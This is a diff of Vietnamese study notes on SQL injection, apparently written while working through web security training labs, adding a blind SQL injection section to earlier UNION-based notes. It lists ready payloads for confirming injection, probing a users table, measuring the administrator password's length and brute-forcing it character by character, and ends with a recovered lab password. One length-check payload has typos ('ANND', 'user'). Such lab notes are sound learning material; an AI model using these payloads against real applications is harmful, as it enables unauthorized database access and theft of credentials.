@@ -60,14 +60,14 @@ Lưu ý: các lệnh SQLI sử dụng dấu + là để thay cho dấu space or 
 @Injection xác định số lượng cột được trả về bởi truy vấn
 (Burp) thay đổi category
 '+UNION+SELECT+NULL--
-or 
+Hoặc 
 '+UNION+SELECT+NULL,NULL--
 thêm ,NULL cho đến khi ko bị lỗi nữa.
 
 @Tìm một cột chứa văn bản
 #Xác định số cột được trả về bởi truy vấn
 '+UNION+SELECT+NULL,NULL--    (,NULL cộng dần)
-#Thay thế giá trị ngẫu nheien vô null 
+#Thay thế giá trị ngẫu nhiên vô null 
 VD: 
 '+UNION+SELECT+'abcd',NULL,NULL--
 '+UNION+SELECT+NULL,'abcd',NULL--
@@ -91,5 +91,27 @@ Xác minh rằng truy vấn trả về hai cột, trong đó chỉ có một c�
 ||'~'|| dùng để ngăn cách username , password bằng dấu ~
 
 
+<BLIND SQL INJECTION>
+VIDEO THAM KHẢO YTB : Search YTB COOKIE HÂN HOAN BLIND SQL INJECTION
 
+// Khi rq để ý theo phiên cookie thì sẽ có chữ Welcomeback! or ko. 
+//Giống như True or False được trả về
 
+#Check và nhận thấy nó trả về True khi and 1 = 1 và False khi 1 = 2
+TrackingId=xyz' AND '1'='1
+TrackingId=xyz' AND '1'='2
+
+#Kiểm tra sự tồn tại của bảng users
+TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1) = 'a    // True
+
+#Kiểm tra username administrator có tồn tại không
+TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username = 'administrator') = 'a
+
+#Check độ dài của password (Thay [x] thành số kí tự muốn so sánh để tìm ra)
+TrackingId=xyz' AND (SELECT 'a' FROM user WHERE username = 'administrator' ANND LENGTH(password)>[x]) = 'a
+
+#Brute Force password (Thay [n] và [m] cho kí tự thứ n và chữ cái m )
+TrackingId=xyz' AND (SELECT SUBSTRING(password,[n],1) FROM users WHERE username = 'administrator') = '[m]
+LƯU Ý : Dùng tab Intruder , Chỉnh attack type thành Cluster Bomb để đổi được nhiều giá trị (giống [m] và [n])
+=> 20 kí tự
+pass : lfpv794meqaknkvo4u1n
